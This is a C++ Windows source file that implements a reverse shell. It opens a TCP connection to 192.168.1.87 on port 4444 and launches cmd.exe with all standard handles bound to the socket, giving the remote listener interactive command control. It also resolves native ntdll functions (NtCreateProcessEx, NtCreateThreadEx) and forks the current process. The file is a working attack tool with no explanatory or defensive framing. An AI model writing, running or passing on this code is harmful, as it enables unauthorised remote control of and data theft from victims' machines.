#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <winternl.h>

#pragma comment(lib, "Ws2_32.lib")

#define STATUS_SUCCESS ((NTSTATUS)0x00000000)

typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    BOOLEAN InJob
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    std::cerr << "[DEBUG] Initializing Winsock...\n";
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[ERROR] WSAStartup failed.\n";
        return 1;
    }

    std::cerr << "[DEBUG] Creating socket...\n";
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "[ERROR] Socket creation failed.\n";
        WSACleanup();
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("192.168.1.87");

    std::cerr << "[DEBUG] Attempting to connect to server...\n";
    if (connect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cerr << "[ERROR] Connection to server failed.\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    std::cerr << "[DEBUG] Connected to server.\n";

    std::cerr << "[DEBUG] Resolving NtCreateProcessEx and NtCreateThreadEx...\n";
    pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateProcessEx");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");

    if (!NtCreateProcessEx || !NtCreateThreadEx) {
        std::cerr << "[ERROR] Failed to resolve NtCreateProcessEx or NtCreateThreadEx.\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cerr << "[DEBUG] NtCreateProcessEx and NtCreateThreadEx resolved.\n";

    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES objAttr;
    ZeroMemory(&objAttr, sizeof(objAttr));
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    std::cerr << "[DEBUG] Creating cmd.exe process using NtCreateProcessEx...\n";
    NTSTATUS status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, &objAttr, GetCurrentProcess(), 0, NULL, NULL, NULL, FALSE);

    if (status != STATUS_SUCCESS) {
        std::cerr << "[ERROR] NtCreateProcessEx failed with status code: " << status << "\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cerr << "[DEBUG] Process created successfully.\n";

    // Now attempt to execute cmd.exe directly within the created process
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    std::cerr << "[DEBUG] Attempting to execute cmd.exe using CreateProcessA as a fallback...\n";
    if (!CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "[ERROR] CreateProcessA failed.\n";
        CloseHandle(hProcess);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cerr << "[DEBUG] cmd.exe started successfully using CreateProcessA.\n";
    
    // Wait for cmd.exe to terminate
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hProcess);
    closesocket(sock);
    WSACleanup();

    std::cerr << "[DEBUG] Cleanup complete.\n";
    return 0;
}
